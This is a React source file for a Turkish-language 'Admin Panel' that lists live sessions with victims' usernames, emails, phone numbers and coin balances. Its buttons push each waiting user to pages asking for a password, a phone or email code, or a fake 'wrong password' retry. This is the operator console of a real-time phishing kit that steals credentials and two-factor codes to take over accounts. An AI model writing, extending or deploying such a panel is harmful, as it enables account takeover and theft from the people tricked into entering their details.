import React, { useState, useEffect } from 'react';
import { Button } from '../components/ui/button';
import axios from 'axios';

const BACKEND_URL = process.env.REACT_APP_BACKEND_URL;
const API = `${BACKEND_URL}/api`;

const AdminPanelPage = () => {
  const [sessions, setSessions] = useState([]);
  const [loading, setLoading] = useState(false);

  const fetchSessions = async () => {
    try {
      setLoading(true);
      const response = await axios.get(`${API}/sessions`);
      // Filter only sessions with email (completed contact form)
      const activeSessions = response.data.filter(s => s.email && s.email !== 'None');
      setSessions(activeSessions.slice(0, 20)); // Last 20
    } catch (error) {
      console.error('Error fetching sessions:', error);
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchSessions();
    // Auto refresh every 10 seconds
    const interval = setInterval(fetchSessions, 10000);
    return () => clearInterval(interval);
  }, []);

  const setAction = async (sessionId, action) => {
    try {
      await axios.post(`${API}/admin/action`, {
        session_id: sessionId,
        action: action
      });
      alert(`✅ Action set: ${action}\nKullanıcı waiting sayfasında ise yönlendirilecek!`);
    } catch (error) {
      console.error('Error setting action:', error);
      alert('❌ Hata: ' + error.message);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-b from-[#0a0a0b] via-[#121214] to-[#0a0a0b] p-8">
      <div className="max-w-7xl mx-auto">
        {/* Header */}
        <div className="mb-8">
          <h1 className="text-4xl font-bold text-white mb-2">🎮 Admin Panel</h1>
          <p className="text-gray-400">Aktif kullanıcıları yönetin</p>
          <Button
            onClick={fetchSessions}
            disabled={loading}
            className="mt-4 bg-cyan-500 hover:bg-cyan-600 text-white"
          >
            {loading ? '⏳ Yükleniyor...' : '🔄 Yenile'}
          </Button>
        </div>

        {/* Sessions List */}
        <div className="grid gap-4">
          {sessions.length === 0 ? (
            <div className="bg-[#1a1a1c] border border-gray-700 rounded-xl p-8 text-center">
              <p className="text-gray-400 text-lg">Aktif session yok</p>
            </div>
          ) : (
            sessions.map((session) => (
              <div
                key={session.session_id}
                className="bg-[#1a1a1c] border border-gray-700 rounded-xl p-6"
              >
                {/* Session Info */}
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                  <div>
                    <p className="text-gray-400 text-sm">Username</p>
                    <p className="text-white text-lg font-semibold">{session.username || 'N/A'}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Email</p>
                    <p className="text-cyan-400">{session.email}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Phone</p>
                    <p className="text-white">{session.phone || 'N/A'}</p>
                  </div>
                  <div>
                    <p className="text-gray-400 text-sm">Amount</p>
                    <p className="text-green-400 font-bold">{session.amount?.toLocaleString() || 'N/A'} Coins</p>
                  </div>
                </div>

                {/* Session ID */}
                <div className="mb-4 p-3 bg-[#0f0f10] rounded-lg">
                  <p className="text-gray-400 text-xs">Session ID</p>
                  <p className="text-gray-300 text-sm font-mono break-all">{session.session_id}</p>
                </div>

                {/* Action Buttons */}
                <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                  <Button
                    onClick={() => setAction(session.session_id, 'password')}
                    className="bg-red-600 hover:bg-red-700 text-white text-sm"
                  >
                    🔐 Password
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'form')}
                    className="bg-blue-600 hover:bg-blue-700 text-white text-sm"
                  >
                    📝 Form
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'phone_code')}
                    className="bg-purple-600 hover:bg-purple-700 text-white text-sm"
                  >
                    📱 Phone Code
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'email_code')}
                    className="bg-orange-600 hover:bg-orange-700 text-white text-sm"
                  >
                    📧 Email Code
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'wrong_password')}
                    className="bg-yellow-600 hover:bg-yellow-700 text-white text-sm"
                  >
                    ❌ Wrong Password
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'wrong_code')}
                    className="bg-pink-600 hover:bg-pink-700 text-white text-sm"
                  >
                    🚫 Wrong Code
                  </Button>
                  <Button
                    onClick={() => setAction(session.session_id, 'finish')}
                    className="bg-green-600 hover:bg-green-700 text-white text-sm col-span-2"
                  >
                    ✅ Finish
                  </Button>
                </div>
              </div>
            ))
          )}
        </div>
      </div>
    </div>
  );
};

export default AdminPanelPage;
